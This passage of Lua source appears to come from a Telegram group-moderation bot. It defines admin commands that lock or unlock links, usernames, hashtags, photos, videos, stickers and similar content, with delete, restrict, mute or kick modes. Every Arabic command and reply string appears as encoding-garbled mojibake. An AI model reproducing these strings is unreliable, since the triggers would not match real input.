database:set(bot_id.."Lock:tagservr"..msg.chat_id_,true) 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ" and msg.reply_to_message_id_ == 0 and Creator(msg) then 
database:set(bot_id.."lockpin"..msg.chat_id_, true) 
database:sadd(bot_id.."Lock:pin",msg.chat_id_) 
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","") }, function(arg,data) database:set(bot_id.."Pin:Id:Msg"..msg.chat_id_,data.pinned_message_id_) end,nil)
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ ΩΩΨ§") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨͺΨΉΨ―ΩΩ" and msg.reply_to_message_id_ == 0 and Creator(msg) then 
database:set(bot_id.."Lock:edit"..msg.chat_id_,true) 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩΩ ΨͺΨΉΨ―ΩΩ") 
return false
end 
if text == "ΩΩΩ ΨͺΨΉΨ―ΩΩ Ψ§ΩΩΩΨ―ΩΨ§" and msg.reply_to_message_id_ == 0 and Creator(msg) then 
database:set(bot_id.."Lock:edit"..msg.chat_id_,true) 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩΩ ΨͺΨΉΨ―ΩΩ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩ" and msg.reply_to_message_id_ == 0 and Creator(msg) then 
database:set(bot_id.."Lock:tagservrbot"..msg.chat_id_,true) 
list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..''..lock..msg.chat_id_,"del") 
end
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩΩ Ψ¬ΩΩΨΉ Ψ§ΩΨ§ΩΨ§ΩΨ±") 
return false
end 

--------------------------------------------------------------------------------------------------------------
if text == "ΩΨͺΨ­ Ψ§ΩΨ§ΨΆΨ§ΩΩ" and msg.reply_to_message_id_ == 0 and Admin(msg) then 
database:del(bot_id.."Lock:AddMempar"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","Ω­ ΨͺΩ ΩΨͺΨ­ Ψ§ΨΆΨ§ΩΨ© Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘") 
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω" and msg.reply_to_message_id_ == 0 and Manger(msg) then 
database:del(bot_id.."Lock:text"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","Ω­ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ―Ψ±Ψ―Ψ΄Ω") 
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨ―Ψ?ΩΩ" and msg.reply_to_message_id_ == 0 and Admin(msg) then 
database:del(bot_id.."Lock:Join"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","Ω­ ΨͺΩ ΩΨͺΨ­ Ψ―Ψ?ΩΩ Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘") 
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ" and msg.reply_to_message_id_ == 0 and Admin(msg) then 
database:del(bot_id.."Lock:Bot:kick"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","Ω­ ΨͺΩ ΩΩΨͺΨ­ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ") 
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ " and msg.reply_to_message_id_ == 0 and Admin(msg) then 
database:del(bot_id.."Lock:Bot:kick"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","π\nΩ­ ΨͺΩ ΩΩΨͺΨ­ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ") 
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ" and msg.reply_to_message_id_ == 0 and Admin(msg) then 
database:del(bot_id.."Lock:tagservr"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","Ω­ ΨͺΩ ΩΩΨͺΨ­ Ψ§ΩΨ§Ψ΄ΨΉΨ§Ψ±Ψ§Ψͺ") 
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ" and msg.reply_to_message_id_ == 0 and Creator(msg) then 
database:del(bot_id.."lockpin"..msg.chat_id_) 
database:srem(bot_id.."Lock:pin",msg.chat_id_)
Reply_Status(msg,msg.sender_user_id_,"unlock","Ω­ ΨͺΩ ΩΩΨͺΨ­ Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ ΩΩΨ§") 
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨͺΨΉΨ―ΩΩ" and msg.reply_to_message_id_ == 0 and Creator(msg) then 
database:del(bot_id.."Lock:edit"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","Ω­ ΨͺΩ ΩΩΨͺΨ­ ΨͺΨΉΨ―ΩΩ") 
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨͺΨΉΨ―ΩΩ Ψ§ΩΩΩΨ―ΩΨ§" and msg.reply_to_message_id_ == 0 and Creator(msg) then 
database:del(bot_id.."Lock:edit"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","Ω­ ΨͺΩ ΩΩΨͺΨ­ ΨͺΨΉΨ―ΩΩ") 
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΩΩ" and msg.reply_to_message_id_ == 0 and Admin(msg) then 
database:del(bot_id.."Lock:tagservrbot"..msg.chat_id_) 
list ={"Lock:Bot:kick","Lock:User:Name","Lock:hashtak","Lock:Cmd","Lock:Link","Lock:forward","Lock:Keyboard","Lock:geam","Lock:Photo","Lock:Animation","Lock:Video","Lock:Audio","Lock:vico","Lock:Sticker","Lock:Document","Lock:Unsupported","Lock:Markdaun","Lock:Contact","Lock:Spam"}
for i,lock in pairs(list) do 
database:del(bot_id..''..lock..msg.chat_id_) 
end
Reply_Status(msg,msg.sender_user_id_,"unlock","Ω­ ΨͺΩ ΩΩΨͺΨ­ Ψ¬ΩΩΨΉ Ψ§ΩΨ§ΩΨ§ΩΨ±") 
return false
end 
--------------------------------------------------------------------------------------------------------------
if text == "ΩΩΩ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·" and Admin(msg) then
database:set(bot_id.."Lock:Link"..msg.chat_id_,"del") 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ· Ψ¨Ψ§ΩΨͺΩΩΩΨ―" and Admin(msg) then
database:set(bot_id.."Lock:Link"..msg.chat_id_,"ked") 
Reply_Status(msg,msg.sender_user_id_,"lockkid","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ· Ψ¨Ψ§ΩΩΨͺΩ" and Admin(msg) then
database:set(bot_id.."Lock:Link"..msg.chat_id_,"ktm") 
Reply_Status(msg,msg.sender_user_id_,"lockktm","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ· Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Admin(msg) then
database:set(bot_id.."Lock:Link"..msg.chat_id_,"kick") 
Reply_Status(msg,msg.sender_user_id_,"lockkick","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·") 
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·" and Admin(msg) then
database:del(bot_id.."Lock:Link"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","Ω­ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ±ΩΨ§Ψ¨Ψ·") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ" and Admin(msg) then
database:set(bot_id.."Lock:User:Name"..msg.chat_id_,"del") 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ Ψ¨Ψ§ΩΨͺΩΩΩΨ―" and Admin(msg) then
database:set(bot_id.."Lock:User:Name"..msg.chat_id_,"ked") 
Reply_Status(msg,msg.sender_user_id_,"lockkid","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ Ψ¨Ψ§ΩΩΨͺΩ" and Admin(msg) then
database:set(bot_id.."Lock:User:Name"..msg.chat_id_,"ktm") 
Reply_Status(msg,msg.sender_user_id_,"lockktm","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Admin(msg) then
database:set(bot_id.."Lock:User:Name"..msg.chat_id_,"kick") 
Reply_Status(msg,msg.sender_user_id_,"lockkick","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ") 
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ" and Admin(msg) then
database:del(bot_id.."Lock:User:Name"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","Ω­ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΨΉΨ±ΩΨ§Ψͺ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨͺΨ§Ω" and Admin(msg) then
database:set(bot_id.."Lock:hashtak"..msg.chat_id_,"del") 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨͺΨ§Ω") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨͺΨ§Ω Ψ¨Ψ§ΩΨͺΩΩΩΨ―" and Admin(msg) then
database:set(bot_id.."Lock:hashtak"..msg.chat_id_,"ked") 
Reply_Status(msg,msg.sender_user_id_,"lockkid","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨͺΨ§Ω") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨͺΨ§Ω Ψ¨Ψ§ΩΩΨͺΩ" and Admin(msg) then
database:set(bot_id.."Lock:hashtak"..msg.chat_id_,"ktm") 
Reply_Status(msg,msg.sender_user_id_,"lockktm","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨͺΨ§Ω") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨͺΨ§Ω Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Admin(msg) then
database:set(bot_id.."Lock:hashtak"..msg.chat_id_,"kick") 
Reply_Status(msg,msg.sender_user_id_,"lockkick","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨͺΨ§Ω") 
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨͺΨ§Ω" and Admin(msg) then
database:del(bot_id.."Lock:hashtak"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","Ω­ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨͺΨ§Ω") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ΄Ψ§Ψ±Ψ­Ω" and Admin(msg) then
database:set(bot_id.."Lock:Cmd"..msg.chat_id_,"del") 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ΄Ψ§Ψ±Ψ­Ω") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ΄Ψ§Ψ±Ψ­Ω Ψ¨Ψ§ΩΨͺΩΩΩΨ―" and Admin(msg) then
database:set(bot_id.."Lock:Cmd"..msg.chat_id_,"ked") 
Reply_Status(msg,msg.sender_user_id_,"lockkid","??οΈβΨͺΩ ΩΩΩΩ Ψ§ΩΨ΄Ψ§Ψ±Ψ­Ω") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ΄Ψ§Ψ±Ψ­Ω Ψ¨Ψ§ΩΩΨͺΩ" and Admin(msg) then
database:set(bot_id.."Lock:Cmd"..msg.chat_id_,"ktm") 
Reply_Status(msg,msg.sender_user_id_,"lockktm","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ΄Ψ§Ψ±Ψ­Ω") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ΄Ψ§Ψ±Ψ­Ω Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Admin(msg) then
database:set(bot_id.."Lock:Cmd"..msg.chat_id_,"kick") 
Reply_Status(msg,msg.sender_user_id_,"lockkick","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ΄Ψ§Ψ±Ψ­Ω") 
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨ΄Ψ§Ψ±Ψ­Ω" and Admin(msg) then
database:del(bot_id.."Lock:Cmd"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","Ω­ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ΄Ψ§Ψ±Ψ­Ω") 
return false
end 
if text == 'ΩΩΩ Ψ§ΩΨ³Ψ¨' and msg.reply_to_message_id_ == 0 and Admin(msg) then 
database:set(bot_id..'lock:Fshar'..msg.chat_id_,true) 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ³Ψ¨") 
end
if text == 'ΩΩΩ Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ' and msg.reply_to_message_id_ == 0 and Admin(msg) then 
database:set(bot_id..'lock:Fars'..msg.chat_id_,true) 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ") 
end
if text == 'ΩΨͺΨ­ Ψ§ΩΨ³Ψ¨' and msg.reply_to_message_id_ == 0 and Admin(msg) then 
database:del(bot_id..'lock:Fshar'..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩΩ ΩΩΨͺΨ­ Ψ§ΩΨ³Ψ¨\n") 
end
if text == 'ΩΨͺΨ­ Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ' and msg.reply_to_message_id_ == 0 and Admin(msg) then 
database:del(bot_id..'lock:Fars'..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩΩ ΩΩΨͺΨ­ Ψ§ΩΩΨ§Ψ±Ψ³ΩΩ\n") 
end
if text == "ΩΩΩ Ψ§ΩΨ΅ΩΨ±"and Admin(msg) then
database:set(bot_id.."Lock:Photo"..msg.chat_id_,"del") 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ΅ΩΨ±") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ΅ΩΨ± Ψ¨Ψ§ΩΨͺΩΩΩΨ―" and Admin(msg) then
database:set(bot_id.."Lock:Photo"..msg.chat_id_,"ked") 
Reply_Status(msg,msg.sender_user_id_,"lockkid","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ΅ΩΨ±") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ΅ΩΨ± Ψ¨Ψ§ΩΩΨͺΩ" and Admin(msg) then
database:set(bot_id.."Lock:Photo"..msg.chat_id_,"ktm") 
Reply_Status(msg,msg.sender_user_id_,"lockktm","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ΅ΩΨ±") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ΅ΩΨ± Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Admin(msg) then
database:set(bot_id.."Lock:Photo"..msg.chat_id_,"kick") 
Reply_Status(msg,msg.sender_user_id_,"lockkick","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ΅ΩΨ±") 
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨ΅ΩΨ±" and Admin(msg) then
database:del(bot_id.."Lock:Photo"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","Ω­ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ΅ΩΨ±") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ―ΩΩ" and Admin(msg) then
database:set(bot_id.."Lock:Video"..msg.chat_id_,"del") 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ―ΩΩ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ―ΩΩ Ψ¨Ψ§ΩΨͺΩΩΩΨ―" and Admin(msg) then
database:set(bot_id.."Lock:Video"..msg.chat_id_,"ked") 
Reply_Status(msg,msg.sender_user_id_,"lockkid","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ―ΩΩ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ―ΩΩ Ψ¨Ψ§ΩΩΨͺΩ" and Admin(msg) then
database:set(bot_id.."Lock:Video"..msg.chat_id_,"ktm") 
Reply_Status(msg,msg.sender_user_id_,"lockktm","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ―ΩΩ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ―ΩΩ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Admin(msg) then
database:set(bot_id.."Lock:Video"..msg.chat_id_,"kick") 
Reply_Status(msg,msg.sender_user_id_,"lockkick","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ―ΩΩ") 
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΩΩΨ―ΩΩ" and Admin(msg) then
database:del(bot_id.."Lock:Video"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","Ω­ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΩΨ―ΩΩ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ" and Admin(msg) then
database:set(bot_id.."Lock:Animation"..msg.chat_id_,"del") 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ Ψ¨Ψ§ΩΨͺΩΩΩΨ―" and Admin(msg) then
database:set(bot_id.."Lock:Animation"..msg.chat_id_,"ked") 
Reply_Status(msg,msg.sender_user_id_,"lockkid","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ Ψ¨Ψ§ΩΩΨͺΩ" and Admin(msg) then
database:set(bot_id.."Lock:Animation"..msg.chat_id_,"ktm") 
Reply_Status(msg,msg.sender_user_id_,"lockktm","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Admin(msg) then
database:set(bot_id.."Lock:Animation"..msg.chat_id_,"kick") 
Reply_Status(msg,msg.sender_user_id_,"lockkick","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ") 
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ" and Admin(msg) then
database:del(bot_id.."Lock:Animation"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","Ω­ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΨͺΨ­Ψ±ΩΩ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨" and Admin(msg) then
database:set(bot_id.."Lock:geam"..msg.chat_id_,"del") 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨ Ψ¨Ψ§ΩΨͺΩΩΩΨ―" and Admin(msg) then
database:set(bot_id.."Lock:geam"..msg.chat_id_,"ked") 
Reply_Status(msg,msg.sender_user_id_,"lockkid","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨ Ψ¨Ψ§ΩΩΨͺΩ" and Admin(msg) then
database:set(bot_id.."Lock:geam"..msg.chat_id_,"ktm") 
Reply_Status(msg,msg.sender_user_id_,"lockktm","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Admin(msg) then
database:set(bot_id.."Lock:geam"..msg.chat_id_,"kick") 
Reply_Status(msg,msg.sender_user_id_,"lockkick","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨") 
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨" and Admin(msg) then
database:del(bot_id.."Lock:geam"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","Ω­ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ§ΨΊΨ§ΩΩ" and Admin(msg) then
database:set(bot_id.."Lock:Audio"..msg.chat_id_,"del") 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ§ΨΊΨ§ΩΩ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ§ΨΊΨ§ΩΩ Ψ¨Ψ§ΩΨͺΩΩΩΨ―" and Admin(msg) then
database:set(bot_id.."Lock:Audio"..msg.chat_id_,"ked") 
Reply_Status(msg,msg.sender_user_id_,"lockkid","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ§ΨΊΨ§ΩΩ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ§ΨΊΨ§ΩΩ Ψ¨Ψ§ΩΩΨͺΩ" and Admin(msg) then
database:set(bot_id.."Lock:Audio"..msg.chat_id_,"ktm") 
Reply_Status(msg,msg.sender_user_id_,"lockktm","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ§ΨΊΨ§ΩΩ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ§ΨΊΨ§ΩΩ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Admin(msg) then
database:set(bot_id.."Lock:Audio"..msg.chat_id_,"kick") 
Reply_Status(msg,msg.sender_user_id_,"lockkick","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ§ΨΊΨ§ΩΩ") 
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨ§ΨΊΨ§ΩΩ" and Admin(msg) then
database:del(bot_id.."Lock:Audio"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","Ω­ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ§ΨΊΨ§ΩΩ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ΅ΩΨͺ" and Admin(msg) then
database:set(bot_id.."Lock:vico"..msg.chat_id_,"del") 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ΅ΩΨͺ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ΅ΩΨͺ Ψ¨Ψ§ΩΨͺΩΩΩΨ―" and Admin(msg) then
database:set(bot_id.."Lock:vico"..msg.chat_id_,"ked") 
Reply_Status(msg,msg.sender_user_id_,"lockkid","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ΅ΩΨͺ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ΅ΩΨͺ Ψ¨Ψ§ΩΩΨͺΩ" and Admin(msg) then
database:set(bot_id.."Lock:vico"..msg.chat_id_,"ktm") 
Reply_Status(msg,msg.sender_user_id_,"lockktm","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ΅ΩΨͺ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΨ΅ΩΨͺ Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Admin(msg) then
database:set(bot_id.."Lock:vico"..msg.chat_id_,"kick") 
Reply_Status(msg,msg.sender_user_id_,"lockkick","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΨ΅ΩΨͺ") 
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΨ΅ΩΨͺ" and Admin(msg) then
database:del(bot_id.."Lock:vico"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","Ω­ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΨ΅ΩΨͺ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ¨ΩΨ±Ψ―" and Admin(msg) then
database:set(bot_id.."Lock:Keyboard"..msg.chat_id_,"del") 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ¨ΩΨ±Ψ―") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ¨ΩΨ±Ψ― Ψ¨Ψ§ΩΨͺΩΩΩΨ―" and Admin(msg) then
database:set(bot_id.."Lock:Keyboard"..msg.chat_id_,"ked") 
Reply_Status(msg,msg.sender_user_id_,"lockkid","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ¨ΩΨ±Ψ―") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ¨ΩΨ±Ψ― Ψ¨Ψ§ΩΩΨͺΩ" and Admin(msg) then
database:set(bot_id.."Lock:Keyboard"..msg.chat_id_,"ktm") 
Reply_Status(msg,msg.sender_user_id_,"lockktm","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ¨ΩΨ±Ψ―") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ¨ΩΨ±Ψ― Ψ¨Ψ§ΩΨ·Ψ±Ψ―" and Admin(msg) then
database:set(bot_id.."Lock:Keyboard"..msg.chat_id_,"kick") 
Reply_Status(msg,msg.sender_user_id_,"lockkick","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ¨ΩΨ±Ψ―") 
return false
end 
if text == "ΩΨͺΨ­ Ψ§ΩΩΩΨ¨ΩΨ±Ψ―" and Admin(msg) then
database:del(bot_id.."Lock:Keyboard"..msg.chat_id_) 
Reply_Status(msg,msg.sender_user_id_,"unlock","Ω­ ΨͺΩ ΩΨͺΨ­ Ψ§ΩΩΩΨ¨ΩΨ±Ψ―") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ" and Admin(msg) then
database:set(bot_id.."Lock:Sticker"..msg.chat_id_,"del") 
Reply_Status(msg,msg.sender_user_id_,"lock","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ Ψ¨Ψ§ΩΨͺΩΩΩΨ―" and Admin(msg) then
database:set(bot_id.."Lock:Sticker"..msg.chat_id_,"ked") 
Reply_Status(msg,msg.sender_user_id_,"lockkid","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ") 
return false
end 
if text == "ΩΩΩ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ Ψ¨Ψ§ΩΩΨͺΩ" and Admin(msg) then
database:set(bot_id.."Lock:Sticker"..msg.chat_id_,"ktm") 
Reply_Status(msg,msg.sender_user_id_,"lockktm","Ω­ ΨͺΩ ΩΩΩΩ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ") 
return false
end 
